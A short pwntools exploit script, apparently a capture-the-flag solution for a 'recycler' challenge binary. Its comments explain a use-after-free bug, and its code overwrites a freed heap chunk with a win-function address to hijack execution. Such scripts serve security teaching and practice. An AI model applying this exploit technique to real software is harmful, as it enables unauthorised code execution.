#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./recycler', checksec=False)

def conn():
    if args.REMOTE:
        return remote('offsec.m0lecon.it', 13520)
    return process(elf.path)

p = conn()


# When you call free(items[i]), the heap manager (ptmalloc) takes that memory chunk and places it into a recycling bin 
# (likely the tcache or a fastbin, given its small size of 32 bytes). It tells the system, "This space is available for future 
# allocations."
# the program forgets to clear the pointer. It should contain a line like items[i] = NULL; immediately after the free call. 
# Because it doesn't, the items array still holds a valid memory address pointing to a chunk that is now considered "free." 
# This leftover reference is called a dangling pointer.

# consider case: 3 -> Because items[i] was never set to NULL after being freed, the program assumes it is still perfectly valid. 
# If you select edit and provide the index of the freed chunk, the read function will happily write your payload directly into 
# that freed memory.

win_addr = elf.sym.win

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index:', b'0')
p.sendlineafter(b'data:', b'AAAA')
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'index:', b'0')
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'index:', b'0')
p.sendlineafter(b'payload:', p64(win_addr).ljust(32, b'X'))
p.sendlineafter(b'>', b'4')
p.sendlineafter(b'index:', b'0')

p.interactive()
